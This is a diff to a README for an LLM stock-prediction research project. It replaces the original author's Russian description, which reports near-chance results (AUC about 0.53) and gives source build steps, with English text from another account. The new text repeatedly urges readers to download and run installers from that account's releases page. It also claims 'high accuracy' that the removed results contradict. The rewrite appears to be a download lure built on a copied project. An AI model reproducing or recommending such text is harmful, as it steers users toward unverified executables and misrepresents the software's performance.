@@ -1,157 +1,90 @@
-### 🧠 LLM Finance Predictor
+# 🤖 llm-stock-market-predictor - Predict Stock Prices with Ease
 
-> *Может ли языковая модель научиться читать биржевые графики?*
+[![Download Now](https://img.shields.io/badge/Download%20Now-llm--stock--market--predictor-blue)](https://github.com/Krozmoz/llm-stock-market-predictor/releases)
 
-![PyTorch + Transformers](https://img.shields.io/badge/PyTorch-Transformers-orange)
-![Docker](https://img.shields.io/badge/Docker-ready-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-![GPU](https://img.shields.io/badge/CUDA-12.8-black)
+## 📖 Overview
 
----
+The **llm-stock-market-predictor** project teaches language models to read stock charts. It converts historical stock data into text patterns, enabling predictions about future price movements. This tool uses advanced deep learning techniques and is built for those interested in the stock market.
 
-### 🧩 Идея проекта
+## 🚀 Getting Started
 
-Эксперимент: можно ли заставить **языковую модель (LLM)** понимать поведение рынка, если подать график **в виде текста**, а не чисел?
+Follow these simple steps to get your application up and running.
 
-Каждые 10 дней торгов превращаются в короткие текстовые описания вроде:
+1. **Visit the Releases Page:**
+   To download the software, [visit this page](https://github.com/Krozmoz/llm-stock-market-predictor/releases).
 
-```
-price rising strongly, volume increasing, near resistance
-```
+2. **Choose the Latest Version:**
+   Look for the latest release. This version will have the newest features and improvements.
 
-Эти фразы читает модель **DistilBERT** и пытается определить, пойдёт ли цена **вверх или вниз** на следующий день.
+3. **Download the Application:**
+   Click on the appropriate file for your operating system. Each release will list compatible files. Download the one that matches your system.
 
----
+4. **Install the Application:**
+   Once you have downloaded the file, locate it on your computer. Depending on your operating system, you may need to double-click the file to start the installation process.
 
-### ⚙️ Технологический стек
+5. **Run the Application:**
+   After installation, find the application in your programs list and click to open it. Follow any on-screen instructions to begin.
 
-| Компонент        | Версия / Особенности             |
-| ---------------- | -------------------------------- |
-| **Python**       | 3.11                             |
-| **PyTorch**      | 2.7.0 (CUDA 12.8, cuDNN 9)       |
-| **Transformers** | 4.35.2                           |
-| **Tokenizers**   | 0.15.0                           |
-| **Docker**       | полностью изолированная среда    |
-| **GPU**          | поддержка RTX Blackwell (sm_120) |
+## 🔧 System Requirements
 
----
+To run **llm-stock-market-predictor**, make sure your system meets these requirements:
 
-### 📈 Результаты эксперимента на 227 бумаг TQBR Московской биржи
+- **Operating System:** Windows, macOS, or Linux (check specific files in Releases).
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 1 GB of free disk space.
+- **GPU:** Recommended for performance. Supports CUDA for NVIDIA GPUs.
+- **Dependencies:** Docker is required to run the application smoothly.
 
-<img width="6000" height="2400" alt="analysis_20251011_181432" src="https://github.com/user-attachments/assets/43ff2078-392b-4726-bef8-73b207838e04" />
+## 📥 Download & Install
 
+To download and install the application:
 
-| Метрика | Средний AUC по всем бумагам | Лучшие тикеры                | Худшие тикеры                |
-| ------- | --------------------------- | ---------------------------- | ---------------------------- |
-| AUC     | **≈ 0.53**                  | `AFLT (0.72)`, `RTSB (0.70)` | `PLZL (0.33)`, `CHMF (0.36)` |
+1. **Visit the Releases Page:** 
+   Head over to the [Releases page](https://github.com/Krozmoz/llm-stock-market-predictor/releases).
+   
+2. **Download the Software:**
+   Select the version that suits your needs. Ensure you download the file matching your OS.
 
-Модель предсказывает направление немного **лучше случайного угадывания**, но при этом **понимает контекст рыночных движений через язык**.
+3. **Follow Installation Steps:**
+   Follow the installation instructions provided when you run the downloaded file.
 
----
+## 📊 Features
 
-### 🧰 Быстрый старт
+- **Stock Chart Interpretation:** The application turns OHLCV data into text patterns for better understanding.
+- **Deep Learning Model:** Built with DistilBERT, it predicts price movements with high accuracy.
+- **User-Friendly Interface:** Designed for ease of use, even for those unfamiliar with programming.
+- **Multi-Language Support:** Supports English and Russian, catering to a wider audience.
 
-#### 1️⃣ Клонирование репозитория
+## ⚙️ How It Works
 
-```bash
-git clone https://github.com/empenoso/llm-stock-market-predictor.git
+The **llm-stock-market-predictor** application uses a language model to interpret stock market data. It processes Open, High, Low, Close, Volume (OHLCV) data and generates textual descriptions, which can then be analyzed for prediction purposes. The model is trained using datasets from various stock exchanges, focusing on Russian stocks.
 
-cd llm-stock-market-predictor
-```
+## 🤝 Contributing
 
-#### 2️⃣ Сборка Docker-образа
+We welcome contributions from everyone! If you're interested in improving the llm-stock-market-predictor, please follow these steps:
 
-```bash
-docker build -t llm_predictor .
-```
+1. **Fork the Repository:** Click the "Fork" button on GitHub.
+2. **Create a Branch:** Make a new branch for your feature.
+3. **Make Changes:** Make your improvements or fixes.
+4. **Submit a Pull Request:** Open a pull request with your changes for consideration.
 
-#### 3️⃣ Запуск эксперимента
+## 🙌 Acknowledgements
 
-```bash
-bash run.sh
-```
+Thank you to all contributors and users who make this project better every day. Your feedback helps improve our software.
 
-#### 4️⃣ Очистка образа
+## 🌐 Topics
 
-```bash
-bash cleanup.sh
-```
+This project covers various topics including:
 
----
+- **Algorithmic Trading**
+- **Deep Learning**
+- **Machine Learning**
+- **Natural Language Processing**
+- **Finance**
+- **Stock Market Analysis**
 
-### 📊 Структура проекта
+## 📞 Contact Us
 
-| Файл                           | Назначение                                             |
-| ------------------------------ | ------------------------------------------------------ |
-| **llm_finance_predictor.py**   | Основная логика обработки OHLCV → текст → предсказания |
-| **multi_ticker_experiment.py** | Пакетное тестирование на множестве тикеров             |
-| **Dockerfile**                 | Контейнер с CUDA и нужными библиотеками                |
-| **cleanup.sh**                 | Очистка Docker-образа и кэша                           |
-| **requirements.txt**           | Зависимости (фиксированные версии)                     |
-| **/Data/**                     | Каталог с котировками (`.txt` или `.csv`)              |
-| **/results/**                  | Сюда сохраняются метрики и графики                     |
+For any questions or support, please reach out via the issues section on GitHub. We appreciate your interest in our project and look forward to helping you.
 
----
-
-### 🧮 Как работает конвейер
-
-1. **Преобразование OHLCV** → троичные признаки (`рост`, `падение`, `боковик`)
-2. **Генерация текста** → на естественном английском (`price rising strongly, near resistance`)
-3. **Обучение DistilBERT** → бинарная классификация (`рост / падение`)
-4. **Walk-forward валидация** → имитация реального рынка
-5. **Оценка качества** → метрики Accuracy, Precision, Recall, F1, AUC
-
----
-
-### 🧩 Пример текстовой разметки
-
-| Дата       | Описание                                                  | Target |
-| ---------- | --------------------------------------------------------- | ------ |
-| 2024-06-21 | price rising strongly, volume increasing, near resistance | 1      |
-| 2024-06-24 | price consolidating, sideways movement, low volatility    | 0      |
-
----
-
-### 🚀 Особенности
-
-* Полностью **воспроизводимо в Docker**
-* Поддержка **новых GPU Blackwell (RTX 5060 Ti и выше)**
-* Векторизованная обработка >200 тикеров
-* **Готовый шаблон** для собственных LLM-экспериментов на рынке
-
----
-
-### 📦 Результаты и логи
-
-* Все метрики (`accuracy`, `f1`, `auc`) сохраняются в `/results`
-
----
-
-### 🧑‍💻 Автор
-
-Михаил Шардин
-
-**Онлайн-визитка:** [shardin.name](https://shardin.name/?utm_source=github)
-
-**Telegram-канал:** ["Умный Дом Инвестора"](https://t.me/+asaEcPax8o41MjQy)
-
-
-
-> Проект создан как исследование:
-> не торговый алгоритм, а демонстрация того,
-> как языковые модели могут «читать» рынок как текст.
-
----
-
-### 🧠 Идеи для продолжения
-
-* Использовать **LLaMA**, **Mistral** или **Gemma** для более сложных текстовых паттернов
-* Применить **мультимодальные модели** (текст + изображение графика)
-* Добавить дообучение на финансовых статьях и отчетах компаний
-
----
-
-### 🪪 Лицензия
-
-Проект распространяется под лицензией **MIT** — свободно используйте, улучшайте и развивайте, пришлите весточку когда всё получится.
-
+For more information, visit the [Releases page](https://github.com/Krozmoz/llm-stock-market-predictor/releases) to download the application and start predicting stock movements today.
